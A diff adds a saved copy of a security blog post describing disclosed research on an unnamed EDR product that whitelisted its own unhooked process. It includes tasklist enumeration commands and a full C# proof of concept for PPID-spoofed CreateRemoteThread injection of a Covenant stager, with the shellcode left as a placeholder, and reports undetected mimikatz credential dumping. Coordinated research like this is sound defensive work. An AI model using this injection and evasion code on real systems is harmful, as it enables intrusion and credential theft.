@@ -1,0 +1,421 @@
+# https://riccardoancarani.github.io/2023-08-03-attacking-an-edr-part-1/
+
+<!DOCTYPE html><html lang="en"><!-- Beautiful Jekyll | MIT license | Copyright Dean Attali 2016 -->
+
+
+  <body>
+
+    
+
+  
+    
+
+
+    <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+
+
+
+
+
+<div class="container">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+
+      
+
+      <article role="main" class="blog-post">
+        <h2 id="introduction">Introduction</h2>
+
+<p>DISCLAMER: This post was done in collaboration with Devid Lana. You can find his blog here: <a href="https://her0ness.github.io/">https://her0ness.github.io</a></p>
+
+<p>This post is the first of what - we hope - will be a long series of articles detailing some common flaws that can be found on modern EDR products. By no means this will be a complete reference, but will hopefully provide some practical tools to analyze these gargantuesque products and attempt to understand their functionalities from a black box perspective.</p>
+
+<p>These attacks were actually performed against one of the top tier product in the EDR space, we were fortunate enough that the vendor was keen on collaborating and providing us with a test-bed where we could perform our experiments in a safe and controlled manner. We believe that without this collaboration it wouldn’t have been possible to achieve the results we did, hopefully in the future EDRs will be more open to get tested by researchers. It goes without saying that the specific vendor we worked with was very keen on doing this collaboration and fixed all the issues we reported.</p>
+
+<p>Since our aim is not to name and shame and possibly avoid jail time, we will call this product STRANGETRINITY.</p>
+
+<p>The methodology we followed was partially based on pre-existing research, and it’s impossible not to mention the MDSec’s research on Cylance. To summarise, we gathered previous research and identified the various places within the operating system where EDRs had some presence, both from a configuration and detection perspective:</p>
+
+<ul>
+  <li>Injected DLLs</li>
+  <li>Registry Keys</li>
+  <li>Network Communication</li>
+  <li>Install/Uninstall process</li>
+  <li>File quarantine</li>
+</ul>
+
+<p>At the time of this research, we did not perform any kernel-based analysis as we did not have those skills yet. Note that this first part was technically performed in 2020, so bear in mind that in the past three years the evolution of both offensive and defensive technologies had an extremely fast advancement. it is therefore not guaranteed that this technique will work with actual (2023) modern EDRs.</p>
+
+<h2 id="the-vulnerability">The Vulnerability</h2>
+<p>This piece of research started from a simple hypothesis:</p>
+
+<p>If a process does not load the EDR hooking DLL in memory but other processes do, it must somehow be whitelisted.
+For those who are not familiar with the architecture of an EDR, at least in the past, most of them used to inject a DLL in most of the userland processes. This was done, amongst other things, to perform userland hooking. Hooking is the practice of diverting the flow of a normal API call to modify its functionality and was very popular for game cheat developers.
+EDRs leveraged API hooking to inspect the arguments of various APIs that could be abused by malware to perform things such as process injection. Our idea was simple, if a process does not have the DLL, it’s likely that it will not get inspected in the same way as a process who does.</p>
+
+<p>How to verify this hypothesis tho? We begun by searching all the processes within a VM with the product installed that did not load the DLL, a command similar to the following was used:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /m /FO CSV | findstr /i /v STRANGETRINITY.DLL
+</code></pre></div></div>
+
+<p>Specifically the “tasklist /m” enumerated all the processes and the loaded modules, the “/FO CSV” printed the result in CSV format that were subsequently filtered by the “findstr” command. Interestingly, we got a few hits!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"smss.exe","324","N/A"
+"csrss.exe","452","N/A"
+"wininit.exe","524","N/A"
+"csrss.exe","532","N/A"
+"services.exe","632","N/A"
+"lsass.exe","640","N/A"
+"STRANGETRINITY.exe","6748", [...]
+"MsMpEng.exe","2892","N/A"
+"svchost.exe","688","N/A"
+"SecurityHealthService.exe","1796","N/A" 
+</code></pre></div></div>
+
+<p>Most of the processes in the list had a protection level (PPL) that effectively prevented us from interacting with them in meaningful ways without relying on exploits. However, the STRANGETRINITY.exe process did not have process protection, and was related to the EDR solution itself. We then executed another tasklist command to confirm that indeed the DLL was not being loaded:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /m /fi "PID eq 6748"
+
+Image Name                 	PID Modules
+========================= ======== ============================================
+STRANGETRINITY.exe	6748 ntdll.dll,
+KERNEL32.DLL, KERNELBASE.dll,
+ADVAPI32.dll,
+msvcrt.dll, sechost.dll, RPCRT4.dll,
+USER32.dll, win32u.dll, GDI32.dll,
+gdi32full.dll, msvcp_win.dll, ucrtbase.dll,
+[...]
+</code></pre></div></div>
+
+<p>Interestingly, this process was also running as the current low privileged user account, making it a good candidate for injection.</p>
+
+<p>After a few trials and errors, the solution that we found to be working the best was to utilise the PPID spoofing technique to create a new process, as if it was being spawned by STRANGETRINITY.EXE. As the injection target, we decided to spawn another instance of STRANGETRINITY.EXE.</p>
+
+<p>As far as the injection technique that was used, it was a simple CreateRemoteThread injection, in conjunction with a Covenant shellcode.</p>
+
+<p>After the PoC was crafted and executed, we immediately obtained an implant on the test VM. This was already surprising on its own, as we were using a known C2 framework without obfuscation and an extremely basic injection technique. However, the most interesting fact was that it was possible to execute all sorts of post-exploitation TTPs from that process and nothing would get detected. To exemplify, the mimikatz credential dumping DLL was injected in memory without causing any detection.</p>
+
+<p>Note that this specific behaviour of ignoring post-ex TTPs was happening only when injected with this exact technique against that specific process. Even if you managed to inject a beacon without causing detection in another unrelated process and tried to run things like mimikatz, your session would get killed.</p>
+
+<p>This eventually confirmed our initial hypothesis that the process was indeed whitelisted. Conversations with the vendor and their technical team were extremely useful to understand that this was unintended behaviour and not one of the various injection techniques that simply would fly under the radar regardless.</p>
+
+<h2 id="proof-of-concept-code">Proof Of Concept Code</h2>
+
+<p>The following snippet of code is intended as a Proof Of Concept that was used to confirm the issue</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">using</span> <span class="n">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">;</span>
+<span class="k">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">InteropServices</span><span class="p">;</span>
+
+<span class="k">namespace</span> <span class="n">GruntInjection</span>
+<span class="p">{</span>
+    <span class="k">class</span> <span class="nc">Program</span>
+    <span class="p">{</span>
+        <span class="k">public</span> <span class="k">const</span> <span class="n">uint</span> <span class="n">CreateSuspended</span> <span class="o">=</span> <span class="mh">0x00000004</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">const</span> <span class="n">uint</span> <span class="n">DetachedProcess</span> <span class="o">=</span> <span class="mh">0x00000008</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">const</span> <span class="n">uint</span> <span class="n">CreateNoWindow</span> <span class="o">=</span> <span class="mh">0x08000000</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">const</span> <span class="n">uint</span> <span class="n">ExtendedStartupInfoPresent</span> <span class="o">=</span> <span class="mh">0x00080000</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">ProcThreadAttributeParentProcess</span> <span class="o">=</span> <span class="mh">0x00020000</span><span class="p">;</span>
+
+        <span class="c1">// Hardcoded Grunt Stager</span>
+        <span class="k">public</span> <span class="k">static</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">gruntStager</span> <span class="o">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s">"[[shellcode here]]"</span><span class="p">);</span>
+
+        <span class="k">static</span> <span class="kt">void</span> <span class="n">Main</span><span class="p">(</span><span class="n">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">Length</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">Console</span><span class="p">.</span><span class="n">Error</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"Invalid number of args"</span><span class="p">);</span>
+                <span class="k">return</span><span class="p">;</span>
+            <span class="p">}</span>
+
+            <span class="c1">// Create new process</span>
+            <span class="n">PROCESS_INFORMATION</span> <span class="n">pInfo</span> <span class="o">=</span> <span class="n">CreateTargetProcess</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="kt">int</span><span class="p">.</span><span class="n">Parse</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
+
+            <span class="c1">// Allocate memory</span>
+            <span class="n">IntPtr</span> <span class="n">allocatedRegion</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">pInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">gruntStager</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="n">AllocationType</span><span class="p">.</span><span class="n">Commit</span> <span class="o">|</span> <span class="n">AllocationType</span><span class="p">.</span><span class="n">Reserve</span><span class="p">,</span> <span class="n">MemoryProtection</span><span class="p">.</span><span class="n">ReadWrite</span><span class="p">);</span>
+
+            <span class="c1">// Copy Grunt PIC to new process</span>
+            <span class="n">UIntPtr</span> <span class="n">bytesWritten</span><span class="p">;</span>
+            <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">allocatedRegion</span><span class="p">,</span> <span class="n">gruntStager</span><span class="p">,</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">gruntStager</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="n">out</span> <span class="n">bytesWritten</span><span class="p">);</span>
+
+            <span class="c1">// Change memory region to RX</span>
+            <span class="n">MemoryProtection</span> <span class="n">oldProtect</span><span class="p">;</span>
+            <span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">pInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">allocatedRegion</span><span class="p">,</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">gruntStager</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="n">MemoryProtection</span><span class="p">.</span><span class="n">ExecuteRead</span><span class="p">,</span> <span class="n">out</span> <span class="n">oldProtect</span><span class="p">);</span>
+
+            <span class="c1">// Create the new thread</span>
+            <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">pInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">allocatedRegion</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">static</span> <span class="n">PROCESS_INFORMATION</span> <span class="n">CreateTargetProcess</span><span class="p">(</span><span class="n">string</span> <span class="n">targetProcess</span><span class="p">,</span> <span class="kt">int</span> <span class="n">parentProcessId</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">STARTUPINFOEX</span> <span class="n">sInfo</span> <span class="o">=</span> <span class="k">new</span> <span class="n">STARTUPINFOEX</span><span class="p">();</span>
+            <span class="n">PROCESS_INFORMATION</span> <span class="n">pInfo</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PROCESS_INFORMATION</span><span class="p">();</span>
+
+            <span class="n">sInfo</span><span class="p">.</span><span class="n">StartupInfo</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">Marshal</span><span class="p">.</span><span class="n">SizeOf</span><span class="p">(</span><span class="n">sInfo</span><span class="p">);</span>
+            <span class="n">IntPtr</span> <span class="n">lpValue</span> <span class="o">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
+
+            <span class="k">try</span>
+            <span class="p">{</span>
+                <span class="n">SECURITY_ATTRIBUTES</span> <span class="n">pSec</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SECURITY_ATTRIBUTES</span><span class="p">();</span>
+                <span class="n">SECURITY_ATTRIBUTES</span> <span class="n">tSec</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SECURITY_ATTRIBUTES</span><span class="p">();</span>
+                <span class="n">pSec</span><span class="p">.</span><span class="n">nLength</span> <span class="o">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="n">SizeOf</span><span class="p">(</span><span class="n">pSec</span><span class="p">);</span>
+                <span class="n">tSec</span><span class="p">.</span><span class="n">nLength</span> <span class="o">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="n">SizeOf</span><span class="p">(</span><span class="n">tSec</span><span class="p">);</span>
+
+                <span class="n">uint</span> <span class="n">flags</span> <span class="o">=</span> <span class="n">CreateSuspended</span> <span class="o">|</span> <span class="n">DetachedProcess</span> <span class="o">|</span> <span class="n">CreateNoWindow</span> <span class="o">|</span> <span class="n">ExtendedStartupInfoPresent</span><span class="p">;</span>
+
+                <span class="n">IntPtr</span> <span class="n">lpSize</span> <span class="o">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
+
+                <span class="n">InitializeProcThreadAttributeList</span><span class="p">(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ref</span> <span class="n">lpSize</span><span class="p">);</span>
+                <span class="n">sInfo</span><span class="p">.</span><span class="n">lpAttributeList</span> <span class="o">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="n">AllocHGlobal</span><span class="p">(</span><span class="n">lpSize</span><span class="p">);</span>
+                <span class="n">InitializeProcThreadAttributeList</span><span class="p">(</span><span class="n">sInfo</span><span class="p">.</span><span class="n">lpAttributeList</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ref</span> <span class="n">lpSize</span><span class="p">);</span>
+
+                <span class="n">IntPtr</span> <span class="n">parentHandle</span> <span class="o">=</span> <span class="n">Process</span><span class="p">.</span><span class="n">GetProcessById</span><span class="p">(</span><span class="n">parentProcessId</span><span class="p">).</span><span class="n">Handle</span><span class="p">;</span>
+                <span class="n">lpValue</span> <span class="o">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="n">AllocHGlobal</span><span class="p">(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Size</span><span class="p">);</span>
+                <span class="n">Marshal</span><span class="p">.</span><span class="n">WriteIntPtr</span><span class="p">(</span><span class="n">lpValue</span><span class="p">,</span> <span class="n">parentHandle</span><span class="p">);</span>
+
+                <span class="n">UpdateProcThreadAttribute</span><span class="p">(</span><span class="n">sInfo</span><span class="p">.</span><span class="n">lpAttributeList</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)</span><span class="n">ProcThreadAttributeParentProcess</span><span class="p">,</span> <span class="n">lpValue</span><span class="p">,</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Size</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
+
+                <span class="n">CreateProcess</span><span class="p">(</span><span class="n">targetProcess</span><span class="p">,</span> <span class="n">null</span><span class="p">,</span> <span class="n">ref</span> <span class="n">pSec</span><span class="p">,</span> <span class="n">ref</span> <span class="n">tSec</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">null</span><span class="p">,</span> <span class="n">ref</span> <span class="n">sInfo</span><span class="p">,</span> <span class="n">out</span> <span class="n">pInfo</span><span class="p">);</span>
+
+                <span class="k">return</span> <span class="n">pInfo</span><span class="p">;</span>
+
+            <span class="p">}</span>
+            <span class="n">finally</span>
+            <span class="p">{</span>
+                <span class="n">DeleteProcThreadAttributeList</span><span class="p">(</span><span class="n">sInfo</span><span class="p">.</span><span class="n">lpAttributeList</span><span class="p">);</span>
+                <span class="n">Marshal</span><span class="p">.</span><span class="n">FreeHGlobal</span><span class="p">(</span><span class="n">sInfo</span><span class="p">.</span><span class="n">lpAttributeList</span><span class="p">);</span>
+                <span class="n">Marshal</span><span class="p">.</span><span class="n">FreeHGlobal</span><span class="p">(</span><span class="n">lpValue</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
+        <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">CreateProcess</span><span class="p">(</span><span class="n">string</span> <span class="n">lpApplicationName</span><span class="p">,</span> <span class="n">string</span> <span class="n">lpCommandLine</span><span class="p">,</span> <span class="n">ref</span> <span class="n">SECURITY_ATTRIBUTES</span> <span class="n">lpProcessAttributes</span><span class="p">,</span> <span class="n">ref</span> <span class="n">SECURITY_ATTRIBUTES</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">bInheritHandles</span><span class="p">,</span> <span class="n">uint</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpEnvironment</span><span class="p">,</span> <span class="n">string</span> <span class="n">lpCurrentDirectory</span><span class="p">,</span> <span class="p">[</span><span class="n">In</span><span class="p">]</span> <span class="n">ref</span> <span class="n">STARTUPINFOEX</span> <span class="n">lpStartupInfo</span><span class="p">,</span> <span class="n">out</span> <span class="n">PROCESS_INFORMATION</span> <span class="n">lpProcessInformation</span><span class="p">);</span>
+
+        <span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="o">=</span> <span class="nb">true</span><span class="p">)]</span>
+        <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">InitializeProcThreadAttributeList</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpAttributeList</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwAttributeCount</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwFlags</span><span class="p">,</span> <span class="n">ref</span> <span class="n">IntPtr</span> <span class="n">lpSize</span><span class="p">);</span>
+
+        <span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="o">=</span> <span class="nb">true</span><span class="p">)]</span>
+        <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">UpdateProcThreadAttribute</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpAttributeList</span><span class="p">,</span> <span class="n">uint</span> <span class="n">dwFlags</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">Attribute</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpValue</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">cbSize</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpPreviousValue</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpReturnSize</span><span class="p">);</span>
+
+        <span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="o">=</span> <span class="nb">true</span><span class="p">)]</span>
+        <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">DeleteProcThreadAttributeList</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpAttributeList</span><span class="p">);</span>
+
+        <span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
+        <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="n">uint</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">AllocationType</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="n">MemoryProtection</span> <span class="n">flProtect</span><span class="p">);</span>
+
+        <span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="o">=</span> <span class="nb">true</span><span class="p">)]</span>
+        <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="n">uint</span> <span class="n">nSize</span><span class="p">,</span> <span class="n">out</span> <span class="n">UIntPtr</span> <span class="n">lpNumberOfBytesWritten</span><span class="p">);</span>
+
+        <span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
+        <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="n">uint</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">MemoryProtection</span> <span class="n">flNewProtect</span><span class="p">,</span> <span class="n">out</span> <span class="n">MemoryProtection</span> <span class="n">lpflOldProtect</span><span class="p">);</span>
+
+        <span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="o">=</span> <span class="nb">true</span><span class="p">,</span> <span class="n">CallingConvention</span> <span class="o">=</span> <span class="n">CallingConvention</span><span class="p">.</span><span class="n">StdCall</span><span class="p">)]</span>
+        <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="n">uint</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpStartAddress</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpParameter</span><span class="p">,</span> <span class="n">uint</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpThreadId</span><span class="p">);</span>
+
+        <span class="p">[</span><span class="n">StructLayout</span><span class="p">(</span><span class="n">LayoutKind</span><span class="p">.</span><span class="n">Sequential</span><span class="p">)]</span>
+        <span class="k">public</span> <span class="k">struct</span> <span class="nc">STARTUPINFOEX</span>
+        <span class="p">{</span>
+            <span class="k">public</span> <span class="n">STARTUPINFO</span> <span class="n">StartupInfo</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">lpAttributeList</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="p">[</span><span class="n">StructLayout</span><span class="p">(</span><span class="n">LayoutKind</span><span class="p">.</span><span class="n">Sequential</span><span class="p">)]</span>
+        <span class="k">public</span> <span class="k">struct</span> <span class="nc">STARTUPINFO</span>
+        <span class="p">{</span>
+            <span class="k">public</span> <span class="n">uint</span> <span class="n">cb</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">lpReserved</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">lpDesktop</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">lpTitle</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">uint</span> <span class="n">dwX</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">uint</span> <span class="n">dwY</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">uint</span> <span class="n">dwXSize</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">uint</span> <span class="n">dwYSize</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">uint</span> <span class="n">dwXCountChars</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">uint</span> <span class="n">dwYCountChars</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">uint</span> <span class="n">dwFillAttributes</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">uint</span> <span class="n">dwFlags</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">ushort</span> <span class="n">wShowWindow</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">ushort</span> <span class="n">cbReserved</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">lpReserved2</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">hStdInput</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">hStdOutput</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">hStdErr</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="p">[</span><span class="n">StructLayout</span><span class="p">(</span><span class="n">LayoutKind</span><span class="p">.</span><span class="n">Sequential</span><span class="p">)]</span>
+        <span class="k">public</span> <span class="k">struct</span> <span class="nc">PROCESS_INFORMATION</span>
+        <span class="p">{</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">hThread</span><span class="p">;</span>
+            <span class="k">public</span> <span class="kt">int</span> <span class="n">dwProcessId</span><span class="p">;</span>
+            <span class="k">public</span> <span class="kt">int</span> <span class="n">dwThreadId</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="p">[</span><span class="n">StructLayout</span><span class="p">(</span><span class="n">LayoutKind</span><span class="p">.</span><span class="n">Sequential</span><span class="p">)]</span>
+        <span class="k">public</span> <span class="k">struct</span> <span class="nc">SECURITY_ATTRIBUTES</span>
+        <span class="p">{</span>
+            <span class="k">public</span> <span class="kt">int</span> <span class="n">nLength</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">lpSecurityDescriptor</span><span class="p">;</span>
+            <span class="k">public</span> <span class="kt">int</span> <span class="n">bInheritHandle</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="p">[</span><span class="n">Flags</span><span class="p">]</span>
+        <span class="k">public</span> <span class="k">enum</span> <span class="n">AllocationType</span>
+        <span class="p">{</span>
+            <span class="n">Commit</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">,</span>
+            <span class="n">Reserve</span> <span class="o">=</span> <span class="mh">0x2000</span><span class="p">,</span>
+            <span class="n">Decommit</span> <span class="o">=</span> <span class="mh">0x4000</span><span class="p">,</span>
+            <span class="n">Release</span> <span class="o">=</span> <span class="mh">0x8000</span><span class="p">,</span>
+            <span class="n">Reset</span> <span class="o">=</span> <span class="mh">0x80000</span><span class="p">,</span>
+            <span class="n">Physical</span> <span class="o">=</span> <span class="mh">0x400000</span><span class="p">,</span>
+            <span class="n">TopDown</span> <span class="o">=</span> <span class="mh">0x100000</span><span class="p">,</span>
+            <span class="n">WriteWatch</span> <span class="o">=</span> <span class="mh">0x200000</span><span class="p">,</span>
+            <span class="n">LargePages</span> <span class="o">=</span> <span class="mh">0x20000000</span>
+        <span class="p">}</span>
+
+        <span class="p">[</span><span class="n">Flags</span><span class="p">]</span>
+        <span class="k">public</span> <span class="k">enum</span> <span class="n">MemoryProtection</span>
+        <span class="p">{</span>
+            <span class="n">Execute</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">,</span>
+            <span class="n">ExecuteRead</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">,</span>
+            <span class="n">ExecuteReadWrite</span> <span class="o">=</span> <span class="mh">0x40</span><span class="p">,</span>
+            <span class="n">ExecuteWriteCopy</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">,</span>
+            <span class="n">NoAccess</span> <span class="o">=</span> <span class="mh">0x01</span><span class="p">,</span>
+            <span class="n">ReadOnly</span> <span class="o">=</span> <span class="mh">0x02</span><span class="p">,</span>
+            <span class="n">ReadWrite</span> <span class="o">=</span> <span class="mh">0x04</span><span class="p">,</span>
+            <span class="n">WriteCopy</span> <span class="o">=</span> <span class="mh">0x08</span><span class="p">,</span>
+            <span class="n">GuardModifierflag</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">,</span>
+            <span class="n">NoCacheModifierflag</span> <span class="o">=</span> <span class="mh">0x200</span><span class="p">,</span>
+            <span class="n">WriteCombineModifierflag</span> <span class="o">=</span> <span class="mh">0x400</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<h2 id="outro">Outro</h2>
+<p>To conclude this first post of the saga, we can highlight the fact that these products, although well-structured and composed of high-level technical expertise with broad global success, still have some vulnerabilities. Despite how simple the vulnerability that we showed was, its impact was undeniable.</p>
+
+<p>Unlike anti-cheat products, which focus their efforts on defending a single or a limited number of processes, when it comes to EDR (Endpoint Detection and Response), the attack surface is much broader. This leads to making choices or assumptions that will be inevitably exploited by attackers.
